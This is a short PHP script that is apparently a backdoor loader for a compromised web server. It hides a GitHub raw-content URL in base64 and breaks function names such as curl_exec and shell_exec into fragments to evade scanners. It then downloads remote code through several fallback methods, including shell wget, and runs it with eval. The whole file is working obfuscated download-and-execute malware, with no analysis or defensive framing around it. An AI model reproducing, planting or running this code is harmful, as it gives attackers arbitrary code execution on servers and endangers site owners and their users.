<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$protocol_enc = 'aHR0cHM6Ly8=';
$domain_enc = 'cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ==';
$path_enc = 'RGFtblNlYy94L21haW4vMS50eHQ=';
$decode = function ($encoded_string) {
    return base64_decode($encoded_string);
};
$protocol = $decode($protocol_enc);
$domain = $decode($domain_enc);
$path = $decode($path_enc);
$url = $protocol . $domain . '/' . $path;
$f_ab = 'curl_' . 'init';
$f_cd = 'curl_' . 'exec';
$f_ef = 'curl_' . 'close';
$f_gh = 'file_' . 'get_' . 'contents';
$f_ij = 'f' . 'open';
$f_kl = 'f' . 'close';
$f_mn = 'shell_' . 'exec';
function get_content_from_url($url)
{
    global $f_ab, $f_cd, $f_ef, $f_gh, $f_ij, $f_kl, $f_mn;
    if (function_exists($f_ab)) {
        $ch = $f_ab();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $output = $f_cd($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $f_ef($ch);
        if ($output !== false && $http_code == 200) {
            return $output;
        }
    }
    if (ini_get('allow_url_fopen')) {
        $output = @$f_gh($url);
        if ($output !== false) {
            return $output;
        }
    }
    $handle = @$f_ij($url, 'r');
    if ($handle) {
        $output = '';
        while (!feof($handle)) {
            $output .= fread($handle, 8192);
        }
        $f_kl($handle);
        if ($output !== false) {
            return $output;
        }
    }
    if (function_exists('exec') || function_exists($f_mn)) {
        $output = @$f_mn('wget -q -O - ' . escapeshellarg($url));
        if (!empty($output)) {
            return $output;
        }
    }
    return false;
}
$output = get_content_from_url($url);
if ($output !== false) {
    $run_code = function ($code) {
        return @eval('?>' . $code);
    };
    $run_code($output);
} else {
    echo "GAK BISA TOLOL.";
}
